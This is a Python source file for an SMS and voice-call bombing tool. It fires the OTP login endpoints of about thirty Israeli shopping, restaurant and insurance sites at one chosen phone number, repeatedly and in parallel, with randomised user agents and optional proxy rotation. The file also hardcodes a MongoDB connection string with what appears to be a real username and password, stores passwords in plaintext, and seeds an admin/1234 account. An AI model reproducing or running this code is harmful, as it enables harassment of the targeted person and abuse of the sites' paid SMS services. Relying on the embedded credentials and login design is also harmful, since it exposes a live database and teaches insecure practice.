from pymongo import MongoClient
import concurrent.futures
import requests
import logging
import random
import uuid
import getpass
from urllib.parse import urlparse
import os


MONGO_URI = "mongodb+srv://nordi9991m_db_user:UOQCWTTB5N5w9GKW@cluster0.vphxrsz.mongodb.net/"
client = MongoClient(MONGO_URI)

db = client["my_app_db"]
users_collection = db["users"]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("spammer.log", encoding="utf-8")
    ]
)


def generate_user_agent():
    browsers = [
        ("Chrome", random.choice(["70", "75", "80", "85", "90", "95"])),
        ("Firefox", random.choice(["60", "65", "70", "75", "80", "85"])),
        ("Safari", random.choice(["11", "12", "13", "14", "15"])),
        ("Edge", random.choice(["80", "85", "90", "95"])),
    ]

    os_list = [
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "Linux; Android 10; Pixel 4",
        "Windows NT 6.1; Win64; x64; rv:72.0",
        "X11; Ubuntu; Linux x86_64"
    ]

    browser, version = random.choice(browsers)
    os = random.choice(os_list)

    user_agent = f"Mozilla/5.0 ({os}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version}.0 Safari/537.36"

    logging.info(f"Generated user agent: {user_agent}")
    return user_agent


def load_proxies(filename="proxies.txt"):
    proxies = []
    with open(filename, "r") as file:
        for line in file.readlines():
            line = line.strip()
            proxies.append(line)
    logging.info(f"Loaded proxies: {proxies}")
    return proxies


def get_random_proxy(proxies_list):
    random_proxy = random.choice(proxies_list)
    logging.info(f"Got random proxy: {random_proxy}")
    return random_proxy


def parse_proxy(proxy_str):
    try:
        parsed = urlparse(proxy_str)

        if "@" in parsed.netloc:
            user_info = parsed.netloc.split("@")[0]
            ip_port = parsed.netloc.split("@")[1]
            username, password = user_info.split(":")
            ip, port = ip_port.split(":")

            proxies = {
                "http": f"{parsed.scheme}://{username}:{password}@{ip}:{port}",
                "https": f"{parsed.scheme}://{username}:{password}@{ip}:{port}"
            }
        else:
            ip, port = parsed.netloc.split(":")

            proxies = {
                "http": f"{parsed.scheme}://{ip}:{port}",
                "https": f"{parsed.scheme}://{ip}:{port}"
            }

        logging.info(f"Parsed proxy: {proxies}")
        return proxies

    except Exception as e:
        logging.error(f"Error parsing proxy {proxy_str}: {e}")
        return None


def get_proxies(proxies_list, use_proxies):
    if use_proxies:
        proxy = get_random_proxy(proxies_list)
        return parse_proxy(proxy)
    return None


def send_sms_urbanica(phone_number, proxies=None):
    return requests.post(
        "https://www.urbanica-wh.com/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.urbanica-wh.com",
            "referer": "https://www.urbanica-wh.com/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_castro(phone_number, proxies=None):
    return requests.post(
        "https://www.castro.com/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.castro.com",
            "referer": "https://www.castro.com/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_golfkids(phone_number, proxies=None):
    return requests.post(
        "https://www.golfkids.co.il/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.golfkids.co.il",
            "referer": "https://www.golfkids.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_timberland(phone_number, proxies=None):
    return requests.post(
        "https://www.timberland.co.il/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.timberland.co.il",
            "referer": "https://www.timberland.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_candid(phone_number, proxies=None):
    return requests.post(
        "https://www.candid.co.il/otp-req",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.candid.co.il",
            "referer": "https://www.candid.co.il/login",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "action": "phone-submit",
            "user_login": "1",
            "redirect": "/",
            "v": phone_number
        },
        proxies=proxies
    )


def send_sms_nine_west(phone_number, proxies=None):
    return requests.post(
        "https://www.nine-west.co.il/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "host": "www.nine-west.co.il",
            "origin": "https://www.nine-west.co.il",
            "referer": "https://www.nine-west.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_gali(phone_number, proxies=None):
    return requests.post(
        "https://www.gali.co.il/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "host": "www.gali.co.il",
            "origin": "https://www.gali.co.il",
            "referer": "https://www.gali.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_ronenchen(phone_number, proxies=None):
    return requests.post(
        "https://www.ronenchen.co.il/wp-admin/admin-ajax.php",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.ronenchen.co.il",
            "referer": "https://www.ronenchen.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "action": "datalogics_login_sms",
            "phone": phone_number
        },
        proxies=proxies
    )


def send_sms_hamal(phone_number, proxies=None):
    return requests.post(
        "https://users-auth.hamal.co.il/auth/send-auth-code",
        headers={
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://hamal.co.il",
            "referer": "https://hamal.co.il/",
            "User-Agent": generate_user_agent(),
        },
        json={
            "value": phone_number,
            "type": "phone",
            "projectId": "1"
        },
        proxies=proxies
    )


def send_sms_myofer(phone_number, proxies=None):
    return requests.post(
        "https://server.myofer.co.il/api/sendAuthSms",
        headers={
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "appplatform": "website",
            "content-type": "application/json",
            "origin": "https://myofer.co.il",
            "referer": "https://myofer.co.il/",
            "User-Agent": generate_user_agent(),
        },
        json={
            "phoneNumber": phone_number
        },
        proxies=proxies
    )


def send_sms_papajohns(phone_number, proxies=None):
    return requests.post(
        "https://www.papajohns.co.il/_a/aff_otp_auth",
        headers={
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.papajohns.co.il",
            "referer": "https://www.papajohns.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "phone": phone_number
        },
        proxies=proxies
    )


def send_sms_wesure(phone_number, proxies=None):
    return requests.post(
        "https://b2c.we-sure.co.il/NCP/services/idmServices/sendOTP",
        headers={
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://b2c.we-sure.co.il",
            "referer": "https://b2c.we-sure.co.il/",
            "User-Agent": generate_user_agent(),
        },
        json={
            "Cellphone": f"972{phone_number}",
            "Destination": "",
            "OTPFlag": True,
            "OTPFor": "B2C",
            "Platform_type": "",
            "RequestID": "",
            "Transfer_Type": "SMS",
            "UserId": "",
            "User_type": "",
            "documentModule": "",
            "isUpdateToTargetSystem": True,
            "targetSystem": "B2CFG",
            "userGrpFromJson": "UD User",
            "userIDFromJson": "b2c"
        },
        proxies=proxies
    )


def send_call_wesure(phone_number, proxies=None):
    return requests.post(
        "https://b2c.we-sure.co.il/NCP/services/idmServices/sendOTP",
        headers={
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://b2c.we-sure.co.il",
            "referer": "https://b2c.we-sure.co.il/",
            "User-Agent": generate_user_agent(),
        },
        json={
            "Cellphone": f"972{phone_number}",
            "Destination": "",
            "OTPFlag": True,
            "OTPFor": "B2C",
            "Platform_type": "",
            "RequestID": "",
            "Transfer_Type": "Voice",
            "UserId": "",
            "User_type": "",
            "documentModule": "",
            "isUpdateToTargetSystem": True,
            "targetSystem": "B2CFG",
            "userGrpFromJson": "UD User",
            "userIDFromJson": "b2c"
        },
        proxies=proxies
    )


def send_sms_burgeranch(phone_number, proxies=None):
    return requests.post(
        "https://app.burgeranch.co.il/_a/aff_otp_auth",
        headers={
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://app.burgeranch.co.il",
            "referer": "https://app.burgeranch.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "phone": phone_number
        },
        proxies=proxies
    )


def send_sms_globes(phone_number, proxies=None):
    return requests.post(
        "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
        headers={
            "accept": "text/plain, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://www.globes.co.il/",
            "origin": "https://www.globes.co.il",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "value": phone_number,
            "value_type": None
        },
        proxies=proxies
    )


def send_sms_bfresh(phone_number, proxies=None):
    return requests.post(
        "https://b-fresh.org.il/_a/aff_otp_auth",
        headers={
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://b-fresh.org.il/",
            "origin": "https://b-fresh.org.il",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "phone": phone_number
        },
        proxies=proxies
    )


def send_sms_pizzahut(phone_number, proxies=None):
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
    return requests.post(
        "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://order.pizzahut.co.il",
            "Referer": "https://order.pizzahut.co.il/",
            "User-Agent": generate_user_agent(),
        },
        data=(
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"restaurant_id\"\r\n\r\n"
            f"1\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"phone\"\r\n\r\n"
            f"{phone_number}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"testing\"\r\n\r\n"
            f"false\r\n"
            f"--{boundary}--\r\n"
        ),
        proxies=proxies
    )


def send_sms_japanjapan(phone_number, proxies=None):
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
    return requests.post(
        "https://api-ns.atmos.co.il/tenant/il-atmos/auth/sendValidationCode",
        headers={
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://order.atmos.rest",
            "referer": "https://order.atmos.rest/",
            "user-agent": generate_user_agent(),
        },
        data=(
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"restaurant_id\"\r\n\r\n"
            f"2\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"phone\"\r\n\r\n"
            f"{phone_number}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"testing\"\r\n\r\n"
            f"false\r\n"
            f"--{boundary}--\r\n"
        ),
        proxies=proxies
    )


def send_sms_bethaful(phone_number, proxies=None):
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
    return requests.post(
        "https://api-ns.atmos.co.il/tenant/il-atmos/auth/sendValidationCode",
        headers={
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://order.atmos.rest",
            "referer": "https://order.atmos.rest/",
            "user-agent": generate_user_agent(),
        },
        data=(
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"restaurant_id\"\r\n\r\n"
            f"36\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"phone\"\r\n\r\n"
            f"{phone_number}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"testing\"\r\n\r\n"
            f"false\r\n"
            f"--{boundary}--\r\n"
        ),
        proxies=proxies
    )


def send_sms_furmans(phone_number, proxies=None):
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
    return requests.post(
        "https://api-ns.atmos.co.il/tenant/il-atmos/auth/sendValidationCode",
        headers={
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://order.atmos.rest",
            "referer": "https://order.atmos.rest/",
            "user-agent": generate_user_agent(),
        },
        data=(
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"restaurant_id\"\r\n\r\n"
            f"13\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"phone\"\r\n\r\n"
            f"{phone_number}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"testing\"\r\n\r\n"
            f"false\r\n"
            f"--{boundary}--\r\n"
        ),
        proxies=proxies
    )


def send_sms_steimatzky(phone_number, proxies=None):
    return requests.post(
        "https://www.steimatzky.co.il/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.steimatzky.co.il",
            "referer": "https://www.steimatzky.co.il/",
            "user-agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest",
        },
        data={
            "bot_validation": "1",
            "type": "login",
            "country_code": "972",
            "telephone": phone_number,
            "code": "",
            "compare_email": "",
            "compare_identity": ""
        },
        proxies=proxies
    )


def send_sms_burgerking(phone_number, proxies=None):
    return requests.post(
        "https://www.burgerking.co.il/_a/aff_otp_auth",
        headers={
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.burgerking.co.il",
            "referer": "https://www.burgerking.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "phone": phone_number
        },
        proxies=proxies
    )


def send_sms_alonzo(phone_number, proxies=None):
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
    return requests.post(
        "https://api-ns.atmos.co.il/rest/2059/auth/sendValidationCode",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://order.atmos.rest",
            "Referer": "https://order.atmos.rest/",
            "User-Agent": generate_user_agent(),
        },
        data=(
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"restaurant_id\"\r\n\r\n"
            f"2059\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"phone\"\r\n\r\n"
            f"{phone_number}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"testing\"\r\n\r\n"
            f"false\r\n"
            f"--{boundary}--\r\n"
        ),
        proxies=proxies
    )


def send_sms_stepin(phone_number, proxies=None):
    return requests.post(
        "https://www.stepin.co.il/customer/ajax/post/",
        headers={
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.stepin.co.il",
            "Referer": "https://www.stepin.co.il/",
            "User-Agent": generate_user_agent(),
            "X-Requested-With": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_aldoshoes(phone_number, proxies=None):
    return requests.post(
        "https://www.aldoshoes.co.il/customer/ajax/post/",
        headers={
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.aldoshoes.co.il",
            "Referer": "https://www.aldoshoes.co.il/",
            "User-Agent": generate_user_agent(),
            "X-Requested-With": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_hoodies(phone_number, proxies=None):
    return requests.post(
        "https://www.hoodies.co.il/customer/ajax/post/",
        headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.hoodies.co.il",
            "referer": "https://www.hoodies.co.il/",
            "User-Agent": generate_user_agent(),
            "x-requested-with": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_storyonline(phone_number, proxies=None):
    return requests.post(
        "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
        headers={
            "Content-Type": "application/json",
            "Origin": "https://storyonline.co.il",
            "Referer": "https://storyonline.co.il/",
            "User-Agent": generate_user_agent()
        },
        json={
            "phone": phone_number,
        },
        proxies=proxies
    )


def send_sms_fix(phone_number, proxies=None):
    return requests.post(
        "https://www.fixfixfixfix.co.il/customer/ajax/post/",
        headers={
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Origin": "https://www.fixfixfixfix.co.il",
            "Referer": "https://www.fixfixfixfix.co.il/",
            "User-Agent": generate_user_agent(),
            "X-Requested-With": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_intima(phone_number, proxies=None):
    return requests.post(
        "https://www.intima-il.co.il/customer/ajax/post/",
        headers={
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Origin": "https://www.intima-il.co.il",
            "Referer": "https://www.intima-il.co.il/",
            "User-Agent": generate_user_agent(),
            "X-Requested-With": "XMLHttpRequest"
        },
        data={
            "bot_validation": 1,
            "type": "login",
            "telephone": phone_number,
            "code": None,
            "compare_email": None,
            "compare_identity": None
        },
        proxies=proxies
    )


def send_sms_jackkuba(phone_number, proxies=None):
    return requests.post(
        "https://jack-kuba.co.il/customer/sms/check/",
        headers={
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "Origin": "https://jack-kuba.co.il",
            "Referer": "https://jack-kuba.co.il/",
            "User-Agent": generate_user_agent(),
            "X-Requested-With": "XMLHttpRequest"
        },
        data={
            "telephone": phone_number,
        },
        proxies=proxies
    )


def send_sms_speedo(phone_number, proxies=None):
    return requests.post(
        "https://speedo.co.il/wp-admin/admin-ajax.php",
        headers={
            "User-Agent": generate_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://speedo.co.il/",
            "Origin": "https://speedo.co.il"
        },
        data={
            "mobile_number": phone_number,
            "OtpType": "sms",
            "action": "send_otp"
        },
        proxies=proxies
    )



def send_task(func, phone_number, proxies_list, use_proxies):
    proxies = None
    if use_proxies:
        proxy = get_random_proxy(proxies_list)
        proxies = parse_proxy(proxy)

    response = func(phone_number, proxies)
    status_code = response.status_code
    source = func.__name__.replace("send_sms_", "").replace("send_call_", "").replace("_", " ").title()
    if 200 <= status_code < 300:
        logging.info(f"{func.__name__} -> SUCCESS -> {response.text}")
        print(f"✔ 777 sent from: {source}")
    else:
        logging.info(f"{func.__name__} -> FAILURE -> {response.text}")
        print(f"✖ FAILED from: {source}")


def login():
    cache_file = "login.txt"

    # Check if credentials are cached
    if os.path.exists(cache_file):
        with open(cache_file, "r") as f:
            saved_username, saved_password = f.read().strip().split(":")
            user = users_collection.find_one({"username": saved_username, "password": saved_password})
            if user:
                print(f"✅ Auto-logged in as {saved_username}\n")
                return True
            else:
                print("⚠️ Saved login invalid, please log in again.\n")

    # Normal login flow
    print("=== Login Required ===")
    username = input("Username: ").strip()
    password = getpass.getpass("Password: ").strip()

    # Check credentials in DB
    user = users_collection.find_one({"username": username, "password": password})

    if user:
        print(f"✅ Welcome back, {username}!\n")

        # Save credentials locally
        with open(cache_file, "w") as f:
            f.write(f"{username}:{password}")

        return True
    else:
        print("❌ Invalid username or password.\n")
        return False


def main():
    print(r"""

 ___   ___   ______   __       __       ______       ___   __     ________  _______    _______    ________      
/__/\ /__/\ /_____/\ /_/\     /_/\     /_____/\     /__/\ /__/\  /_______/\/______/\  /______/\  /_______/\     
\::\ \\  \ \\::::_\/_\:\ \    \:\ \    \:::_ \ \    \::\_\\  \ \ \__.::._\/\::::__\/__\::::__\/__\::: _  \ \    
 \::\/_\ .\ \\:\/___/\\:\ \    \:\ \    \:\ \ \ \    \:. `-\  \ \   \::\ \  \:\ /____/\\:\ /____/\\::(_)  \ \   
  \:: ___::\ \\::___\/_\:\ \____\:\ \____\:\ \ \ \    \:. _    \ \  _\::\ \__\:\\_  _\/ \:\\_  _\/ \:: __  \ \  
   \: \ \\::\ \\:\____/\\:\/___/\\:\/___/\\:\_\ \ \    \. \`-\  \ \/__\::\__/\\:\_\ \ \  \:\_\ \ \  \:.\ \  \ \ 
    \__\/ \::\/ \_____\/ \_____\/ \_____\/ \_____\/     \__\/ \__\/\________\/ \_____\/   \_____\/   \__\/\__\/ 
                                                                                                                
     
    """)
    print("=== You DOMED MA FIREND ===")
    phone_number = input("Enter phone number: ").strip()
    send_count = int(input("How many times to send?: ").strip())
    use_proxies = False 
    proxies_list = [] if use_proxies else []

    functions = [
        send_sms_urbanica,
        send_sms_castro,
        send_sms_golfkids,
        send_sms_timberland,
        send_sms_candid,
        send_sms_nine_west,
        send_sms_gali,
        send_sms_ronenchen,
        send_sms_hamal,
        send_sms_myofer,
        send_sms_papajohns,
        send_sms_wesure,
        send_call_wesure,
        send_sms_burgeranch,
        send_sms_globes,
        send_sms_bfresh,
        send_sms_pizzahut,
        send_sms_japanjapan,
        send_sms_bethaful,
        send_sms_furmans,
        send_sms_steimatzky,
        send_sms_burgerking,
        send_sms_alonzo,
        send_sms_stepin,
        send_sms_aldoshoes,
        send_sms_hoodies,
        send_sms_storyonline,
        send_sms_fix,
        send_sms_intima,
        send_sms_jackkuba,
        send_sms_speedo
    ]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for _ in range(send_count):
            for func in functions:
                logging.info(f"Executing function {func.__name__} on phone number: {phone_number}")
                futures.append(
                    executor.submit(send_task, func, phone_number, proxies_list, use_proxies)
                )

if __name__ == "__main__":
    # Make sure at least one user exists
    if users_collection.count_documents({"username": "admin"}) == 0:
        users_collection.insert_one({"username": "admin", "password": "1234"})
      #  print("ℹ️ Default admin account created (username: admin, password: 1234)\n")

    if login():
        main()